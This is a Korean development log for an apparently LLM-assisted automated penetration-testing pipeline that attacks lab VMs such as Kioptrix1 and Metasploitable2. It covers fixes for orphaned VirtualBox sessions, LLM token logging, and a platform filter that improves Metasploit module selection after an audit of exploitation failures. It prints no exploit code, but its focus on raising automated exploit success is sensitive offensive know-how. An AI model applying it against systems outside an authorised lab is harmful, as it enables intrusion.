새 쿼리 로직의 문제가 아니라 **기존 스캔 데이터 자체**가 버그 3(세션 락 경쟁)
때문에 버전 정보 없이 남아있어서다 - 다음에 처음부터 다시 스캔하면(버그 3
수정이 반영된 상태로) enum4linux가 정상적으로 Samba 버전을 얻어올 가능성이
높음, 이 부분은 재스캔해야 최종 확인됨.

## 56. Kioptrix1 세 번째 시도 — orphan guestcontrol 세션 누적으로 searchsploit 전체 실패

55절 수정을 반영한 재실행(`20260812-060515-kioptrix1`)에서도 여전히 플래그를
못 가져왔다는 지적을 받고 findings를 다시 추적했다. 이번엔 **코드 버그가
전혀 아니었다** - port 443의 실제 검색어가 정확히 `"Apache 1.3.20 mod_ssl
2.8.4 OpenSSL 0.9.6b"`(55절 수정 그대로)로 만들어졌는데도 `searchsploit_lookup_failed`
이벤트가 남아있었고, 원인은 `VBoxManage.exe: error: Error starting guest
session`, `VERR_DUPLICATE`, `session terminated` - **VirtualBox guestcontrol
세션 자체를 못 여는** 인프라 레벨 실패였다.

`env.health_check.check_orphaned_sessions()`로 확인해보니 **orphan 세션
9개**가 쌓여있었다 - 이 세션 동안 반복된 실전 테스트(Kioptrix1 여러 번,
Metasploitable2 여러 번, exploit_doctor/ad_agent 검증 등)에서 제대로 안
닫힌 guestcontrol 세션들이 누적돼 VirtualBox의 동시 세션 개수 제한에
걸린 것으로 보인다. 메모리(1310MB 가용)/부하(load 0.04)는 둘 다 정상이었음
- 순수히 세션 개수 문제.

**수정**: `run_pipeline.py`의 "Kali 확인" 단계(45/51절에서 추가한
`ensure_kali_running()` 호출 직후)에 `_clear_orphaned_sessions_if_any()`를
추가 - orphan 세션이 있으면 `close_all_sessions()`로 정리한다.
`ensure_kali_running()`은 VM 상태/게스트 응답성만 보므로 이 케이스(응답은
정상으로 되는데 세션 슬롯만 소진된 상태)를 못 잡아서 별도로 확인해야 했다.
`_run_pipeline_stages()`/`_run_interactive()` 양쪽 진입점 모두에 적용.

**실측 검증**: `close_all_sessions()` 실행 후 orphan 세션 0개로 정리 확인,
곧바로 같은 searchsploit 쿼리를 재실행해서 OpenFuck 익스플로잇이 정상적으로
검색됨을 확인.

**교훈**: 이 세션에서 오늘 하루에만 Kali 불안정성의 서로 다른 원인 3개
(43절 디스크 100% 참, 방금의 메모리 59MB 고갈, 지금의 orphan 세션 9개
누적)를 순서대로 겪었다 - 전부 "guestcontrol이 이상하게 실패한다"는 같은
증상으로 나타나지만 원인은 매번 다르다. `health_check.run_diagnosis()`가
이 셋을 전부 한 번에 점검하는 함수인데도 파이프라인 진입 시점엔 아직 그
전체를 안 쓰고 있음 - 지금은 필요한 것만 부분적으로(`ensure_kali_running`
+ 세션 정리) 이어붙인 상태. 다음에 또 다른 새 원인이 나오면, 그때는
`run_diagnosis()` 전체를 파이프라인 진입점에 쓰는 방향으로 정리하는 게
맞을 수 있음(TODO로 남김).

## 57. orphan 세션 근본 원인 수정 — job_runner.py가 세션을 아예 안 닫고 있었음

56절은 "이미 쌓인 orphan 세션을 파이프라인 시작할 때 치우는" 대증 요법이었다
- 사용자가 "애초에 안 쌓이게 고친 거야?"라고 정확히 지적해서 근본 원인을
다시 봤다.

**원인**: `run_in_kali()`는 `guestcontrol ... run`(동기)을 쓰는데, 이건
정상 종료 시 세션이 자동 정리되고 타임아웃 시에도 `_run_in_kali_locked()`가
명시적으로 `_close_all_sessions_locked()`를 부른다 - 이 경로는 원래도
문제없었다. 반면 `job_runner.start_job()`은 nmap/msfconsole -x/sqlmap 같은
장시간 job을 위해 `guestcontrol ... start`(비동기)를 쓰는데, **이 세션을
어디서도 명시적으로 닫은 적이 없었다** - job이 성공하든 실패하든 타임아웃
나든 상관없이. 오늘 세션 동안 이런 job이 수십 번 실행되면서 매번 세션이
하나씩 orphan으로 남아 누적됐고, 결국 9개까지 쌓여서 VirtualBox 동시 세션
제한에 걸려 이후의 모든 guestcontrol 호출이 실패하기 시작한 게 56절의
실제 정체였다.

**수정**: `job_runner.py`의 `wait_for_job()`을 얇은 래퍼로 만들어서, 실제
폴링 로직(`_wait_for_job_inner()`로 이름 변경, 로직 자체는 그대로)을
`try/finally`로 감싸고 **job이 어떻게 끝나든 항상** `close_all_sessions()`
를 부르게 했다 - 성공/died_unexpectedly/hard_timeout/target_unreachable
전부 이 한 지점을 거쳐가므로 호출부마다 따로 손댈 필요가 없다.

**실측 검증**: `sleep 3` job을 `start_job`+`wait_for_job`으로 3회 연속
실행하면서 매번 `check_orphaned_sessions()`로 확인 - 시작 전 0개, 3번
실행 후에도 계속 0개 유지됨을 확인. 56절의 "시작할 때 청소"는 혹시
과거 세션에서 넘어온 잔재나 이 수정 이전 코드 경로(예: 직접
`run_in_kali()`를 호출하는 다른 곳)를 대비한 안전망으로 남겨둠.

## 58. LLM 호출 콘솔 로그에 토큰 수 표시 추가

사용자 요청: "토큰수와 API 경우 과금되는 금액을 표시". 기존엔 종량제(API)
경로만 비용을 찍고 토큰 수는 아예 안 보였고, 구독 경로는 성공하면 아무것도
안 찍혔다(폴백/에러일 때만 메시지가 남음) - 구독도 직접 과금은 안 되지만
Pro/Max 사용량 한도에는 그대로 들어가므로 토큰 소비가 안 보이는 건 마찬가지로
불투명했다.

`_print_token_usage(label, usage, cost_line="")` 공용 헬퍼를 추가해서 구독
(`_call_via_subscription`)/API(`_call_via_api`)/API+tools(`call_with_tools`)
세 경로 모두에서 호출 하나마다 입력/출력 토큰 수를 찍는다. 캐시 읽기/생성
토큰(`cache_read_input_tokens`/`cache_creation_input_tokens`)도 있으면 같이
보여준다 - 실제 청구/한도 계산에서 일반 토큰과 단가가 다르게 취급되는
값이라 숨기면 오해의 소지가 있음. API 경로 두 곳은 기존 비용 문자열을
그대로 이어붙여서(`cost_line`) 한 줄에 토큰+비용이 같이 보이게 함.
anthropic SDK의 `response.usage`(속성 객체)와 구독 CLI의 JSON `usage`
필드(dict)가 형태가 달라서 `_usage_to_dict()`로 통일.

**실측 검증**: 구독 경로로 짧은 호출 1회 실행 - `[llm_client] 구독 호출:
토큰 입력 2, 출력 4, 캐시읽음 33872, 캐시생성 9570` 정상 출력 확인.

## 59. 전체 engagement 로그 감사 — Exploitation 성공률 낮은 원인 분석, 플랫폼 필터 버그 발견/수정

사용자가 "Exploitation 단계에서 성공한 적이 한 번도 없는 것 같다"고 지적,
지금까지 쌓인 **95개 engagement 전체**의 findings.jsonl을 집계해서 검증했다.

**전제 정정**: 실제로는 6번 성공했음(vsftpd 백도어 root 세션 1회, Kioptrix2/
Juice Shop SQLi 3회, 등). 다만 성공률 자체는 낮음(exploit_success 6건 /
attempt_failed 49건 ≈ 11%) - "한 번도" 는 틀렸지만 문제의식은 유효했다.

실패 49건을 재분류해서 진짜 원인 유형을 나눴다:
- cd 버그(43절, 이미 수정됨) 등 이미 알려진/고쳐진 인프라 문제
- sqlmap이 정말 못 찾은 경우(정상적인 음성 결과, 버그 아님) - 다수
- **msf 모듈은 실행됐지만 세션 생성 실패 - 16건**, 이 중 페이로드별로
  분류해서 새 버그를 찾음:
  - `exploit/freebsd/telnet/telnet_encrypt_keyid`(FreeBSD 전용)가 Linux
    대상(Metasploitable2)에 3회 반복 시도됨
  - GNU InetUtils telnetd 모듈이 x64 페이로드 기본값을 쓰는데 대상은 x86
    이미지(3회) - 이건 대상의 정확한 아키텍처를 지금 코드가 알아낼 방법이
    없어서 이번엔 안 건드림(추측성 수정이 오히려 해로울 수 있음)
  - Airties(MIPS 라우터용) - 이미 알려진 노이즈 후보(confidence 0.02,
    port 513 "login" 키워드 오검색) 문제의 재확인일 뿐
  - UnrealIRCd 백도어 7건은 플랫폼/아키텍처 다 맞는데도 실패 - 원인 불명,
    로그만으론 못 좁힘(재검증 필요, TODO)

**수정한 버그 - Metasploit 모듈 선택이 플랫폼을 전혀 안 봄**: CVE
검색(`find_msf_module`)이 여러 플랫폼의 모듈을 같이 반환할 수 있는데
(실측: CVE-2011-4862가 `exploit/freebsd/telnet/...`와
`exploit/linux/telnet/...` 둘 다 있고 둘 다 rank="great"로 동률), 예전
`_parse_best_msf_module()`은 rank만 보고 **동률이면 먼저 나온 것**을
그대로 썼다 - FreeBSD 모듈이 검색 결과에서 먼저 나와서 매번 그게
선택됐고, 바로 옆에 있던 정확한 Linux 모듈은 한 번도 선택된 적이 없었다.

`ExploitCandidate`에 `platform` 필드 추가(scanning.py의 `platform_detected`
값을 `gather_ranked_candidates()`가 findings에서 읽어와 채움),
`_parse_best_msf_module(search_output, platform="")`이 대상 플랫폼과 다른
세그먼트(`exploit/<세그먼트>/...`)의 모듈은 후보에서 아예 제외하도록 수정.
`_PLATFORM_MODULE_SEGMENTS`로 linux -> {linux, unix, multi},
windows_* -> {windows, multi} 매핑(unix/multi는 여러 OS를 겸하는 모듈이라
허용). platform이 빈 값/모르는 값이면 필터링 안 함(기존 동작 유지 - 잘못된
확신으로 걸러내는 것보다 안전).

**실측 검증**: 위 CVE-2011-4862 검색 결과 샘플로 직접 테스트 -
`_parse_best_msf_module(sample)`(필터 없음)은 여전히 FreeBSD 모듈을 고르고,
`_parse_best_msf_module(sample, "linux")`는 정확히 Linux 모듈을 고름을 확인.
